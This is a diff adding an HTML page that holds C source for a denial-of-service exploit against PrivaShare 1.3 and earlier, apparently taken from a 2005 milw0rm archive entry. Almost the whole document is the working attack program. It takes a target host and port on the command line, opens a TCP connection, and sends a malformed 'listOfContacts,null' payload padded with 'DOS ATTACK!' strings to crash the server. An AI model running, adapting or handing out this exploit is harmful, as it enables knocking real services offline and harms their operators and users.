@@ -1,0 +1,140 @@
+<html>
+<head>
+<title>PrivaShare <= 1.3 Denial of Service Exploit</title>
+<pre>
+/*
+
+   PrivaShare TCP/IP DoS Exploit
+----------------------------------------
+
+Resolve host... [OK]
+ [+] Connecting... [OK]
+Target locked
+Sending bad procedure... [OK]
+ [+] Server DoS'ed
+
+ Tested on Windows2000 SP4
+ Greats: Infam0us Gr0up Team/member,and ll of u..take care!
+
+ Info:
+ - infamous.2hell.com
+ - basher13@linuxmail.org
+
+*/
+
+#include &lt;string.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;stdio.h&gt;
+
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+
+char doscore[] =
+/*
+
+        Offset 0000ca10 to 0000ca2b
+
+0000ca10 6c 00 69 00 73 00 74 00 4f 00 66 00 43 00
+6f 00 6e 00 74 00 61 00 63 00 74 00 73 00
+
+HEX:
+6c 20 69 20 73 20 74 20 4f 20 66 20 43 20 6f 20 6e 20 74
+20 61 20 63 20 74
+
+
+*/
+&quot;listOfContacts,null&quot;
+&quot;***          PrivaShare TCP/IP DoS Exploit        \n&quot;
+&quot;***-----------------------------------------------\n&quot;
+&quot;***   Infam0us Gr0up - Securiti Research Team     \n\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;
+&quot;***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n&quot;;
+
+
+
+int main(int argc, char *argv[])
+{
+WSADATA wsaData;
+WORD wVersionRequested;
+struct hostent *pTarget;
+struct sockaddr_in sock;
+char *target;
+int port,bufsize;
+SOCKET inetdos;
+
+if (argc &lt; 2)
+{
+printf(&quot;        PrivaShare TCP/IP DoS Exploit \n&quot;, argv[0]);
+printf(&quot;  ------------------------------------------\n&quot;, argv[0]);
+printf(&quot;      Infam0us Gr0up - Securiti Research\n\n&quot;, argv[0]);
+printf(&quot;[-]Usage: %s [target] [port]\n&quot;, argv[0]);
+printf(&quot;[?]Exam: %s localhost 2001\n&quot;, argv[0]);
+exit(1);
+}
+
+wVersionRequested = MAKEWORD(1, 1);
+if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1;
+
+target = argv[1];
+port = 2001;
+
+if (argc &gt;= 3) port = atoi(argv[2]);
+bufsize = 1024;
+if (argc &gt;= 4) bufsize = atoi(argv[3]);
+
+inetdos = socket(AF_INET, SOCK_STREAM, 0);
+if(inetdos==INVALID_SOCKET)
+{
+printf(&quot;Socket ERROR \n&quot;);
+exit(1);
+}
+printf(&quot;        PrivaShare TCP/IP DoS Exploit \n&quot;, argv[0]);
+printf(&quot;  ------------------------------------------\r\n\n&quot;, argv[0]);
+printf(&quot;Resolve host... &quot;);
+if ((pTarget = gethostbyname(target)) == NULL)
+{
+printf(&quot;FAILED \n&quot;, argv[0]);
+exit(1);
+}
+printf(&quot;[OK]\n &quot;);
+memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
+sock.sin_family = AF_INET;
+sock.sin_port = htons((USHORT)port);
+
+printf(&quot;[+] Connecting... &quot;);
+if ( (connect(inetdos, (struct sockaddr *)&amp;sock, sizeof (sock) )))
+{
+printf(&quot;FAILED\n&quot;);
+exit(1);
+}
+printf(&quot;[OK]\n&quot;);
+printf(&quot;Target locked\n&quot;);
+printf(&quot;Sending bad procedure... &quot;);
+if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1)
+{
+printf(&quot;ERROR\n&quot;);
+closesocket(inetdos);
+exit(1);
+}
+printf(&quot;[OK]\n &quot;);
+printf(&quot;[+] Server DoS'ed\n&quot;);
+closesocket(inetdos);
+WSACleanup();
+return 0;
+}
+
+// milw0rm.com [2005-07-07]
+</pre>
+</html>
+
